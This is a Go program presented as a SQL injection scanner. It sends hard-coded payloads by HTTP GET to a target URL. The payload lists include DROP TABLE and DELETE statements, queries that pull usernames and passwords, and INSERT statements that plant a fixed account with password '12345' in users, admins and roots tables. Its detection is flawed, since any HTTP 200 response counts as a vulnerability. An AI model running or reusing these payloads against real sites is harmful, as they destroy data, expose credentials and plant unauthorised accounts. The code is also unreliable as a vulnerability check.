package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
)

func scan(url string) bool {
	// common SQL injection payloads
	payloads := []string{
		"' OR 1=1; --",
		"' OR '1'='1",
		"'58' OR 1 = 1;--'",
		"'58';DROP TABLE users--;",
		"58 OR 1=1;SELECT name, email FROM users WHERE ID = '58' OR 1 = 1;--",
		"58 OR 1=1;select username, password from users where 1=1",
		"58 OR 1=1;select username, password from admins where 1=1",
		"58 OR 1=1;select username, password from root where 1=1",
		"58 OR 1=1;select user, pass from users where 1=1",
		"58 OR 1=1;select user, pass from admins where 1=1",
		"58 OR 1=1;select user, pass from root where 1=1",
		"58 OR 1=1;delete from users where 1=1",
		"58 OR 1=1;delete from admins where 1=1",
		"58 OR 1=1;delete from root where 1=1",
		"58 OR 1=1;drop table users",
		"58 OR 1=1;drop table admins",
		"58 OR 1=1;drop table root",
		"1=1;SELECT name, email FROM users WHERE ID = '58' OR 1 = 1;--",
		"1=1;select username, password from users where 1=1",
		"1=1;select username, password from admins where 1=1",
		"1=1;select username, password from root where 1=1",
		"1=1;select user, pass from users where 1=1",
		"1=1;select user, pass from admins where 1=1",
		"1=1;select user, pass from root where 1=1",
		"1=1;delete from users where 1=1",
		"1=1;delete from admins where 1=1",
		"1=1;delete from root where 1=1",
		"1=1;drop table users",
		"1=1;drop table admins",
		"1=1;drop table root",
		"SELECT name, email FROM users WHERE ID = '58';DROP TABLE users--",
		"SELECT name, email FROM users WHERE ID = ?",
	}

	insertPayloads := []string{
		"INSERT INTO users (username, password) VALUES ('amirhossein','12345');",
		"INSERT INTO admins (username, password) VALUES ('amirhossein','12345');",
		"INSERT INTO roots (username, password) VALUES ('amirhossein','12345');",
		"1=1;INSERT INTO users (username, password) VALUES ('amirhossein','12345');",
		"1=1;INSERT INTO roots (username, password) VALUES ('amirhossein','12345');",
		"1=1;INSERT INTO admins (username, password) VALUES ('amirhossein','12345');",
		"58 OR 1=1;INSERT INTO users (username, password) VALUES ('amirhossein','12345');",
		"58 OR 1=1;INSERT INTO roots (username, password) VALUES ('amirhossein','12345');",
		"58 OR 1=1;INSERT INTO admins (username, password) VALUES ('amirhossein','12345');",
	}

	for _, payload := range payloads {
		resp, err := http.Get(url + payload)
		if err != nil {
			log.Println(fmt.Errorf("error checking URL: %w", err))

			continue
		}

		if resp.StatusCode == 200 {
			log.Println(fmt.Errorf("[*] SQL injection vulnerability found in %s", url))

			return true
		}
	}

	for _, payload := range insertPayloads {
		resp, err := http.Get(url + payload)
		if err != nil {
			log.Println(fmt.Errorf("error checking URL: %w", err))

			continue
		}

		if resp.StatusCode == 200 {
			log.Println(fmt.Errorf("[*] SQL injection vulnerability found in %s", url))

			return true
		}
	}

	return false
}

func main() {
	var (
		hostFlag = flag.String("host", "localhost", "target host address")
	)

	flag.Parse()

	if scan(*hostFlag) {
		os.Exit(1)
	}

	os.Exit(0)
}
